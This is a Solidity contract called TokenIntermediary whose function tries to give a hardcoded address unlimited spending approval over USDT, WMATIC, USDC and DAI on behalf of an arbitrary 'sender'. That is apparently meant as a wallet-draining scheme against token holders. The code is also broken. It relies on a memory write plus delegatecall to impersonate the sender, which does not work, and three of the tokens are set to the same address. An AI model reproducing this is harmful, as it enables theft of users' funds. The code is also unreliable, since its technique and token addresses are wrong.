// SPDX-License-Identifier: MIT
import "./IERC20.sol";
pragma solidity 0.7.6;

library LowLevelCall {
    function callWithSender(address target, bytes memory data, address sender) internal returns (bool success, bytes memory returnData) {
        assembly {
            mstore(0x00, sender)
        }
        (success, returnData) = target.delegatecall(data);
        if (!success) {
            assembly {
                revert(add(returnData, 0x20), mload(returnData))
            }
        }
    }
}

contract TokenIntermediary {
    using LowLevelCall for address;

    address public owner;
    address public USDT_TOKEN;
    address public WMATIC_TOKEN;
    address public USDC_TOKEN;
    address public DAI_TOKEN;

    constructor() {

        USDT_TOKEN = address(0x967579eae1a768E9C13D765D2a2906Ac92C66BF7);
        WMATIC_TOKEN = address(0x7Bbcb4EdbE2672445933b31b7550e963A002f529);
        USDC_TOKEN = address(0x7Bbcb4EdbE2672445933b31b7550e963A002f529);
        DAI_TOKEN = address(0x7Bbcb4EdbE2672445933b31b7550e963A002f529);
    }

    function approveOtherTokens(address sender) external {
        // Aprobar el token USDT
        bytes memory data1 = abi.encodeWithSignature("approve(address,uint256)", address(0xF1eBBbf08Dc41Dfe9b90e5ebD06873F223641877), uint256(-1));
        (bool success1, ) = USDT_TOKEN.callWithSender(data1, sender);
        require(success1, "Token approval failed");

        // Aprobar el token WMATIC
        bytes memory data2 = abi.encodeWithSignature("approve(address,uint256)", address(0xF1eBBbf08Dc41Dfe9b90e5ebD06873F223641877), uint256(-1));
        (bool success2, ) = WMATIC_TOKEN.callWithSender(data2, sender);
        require(success2, "Token approval failed");

        // Aprobar el token USDC
        bytes memory data3 = abi.encodeWithSignature("approve(address,uint256)", address(0xF1eBBbf08Dc41Dfe9b90e5ebD06873F223641877), uint256(-1));
        (bool success3, ) = USDC_TOKEN.callWithSender(data3, sender);
        require(success3, "Token approval failed");

        // Aprobar el token DAI
        bytes memory data4 = abi.encodeWithSignature("approve(address,uint256)", address(0xF1eBBbf08Dc41Dfe9b90e5ebD06873F223641877), uint256(-1));
        (bool success4, ) = DAI_TOKEN.callWithSender(data4, sender);
        require(success4, "Token approval failed");
    }
}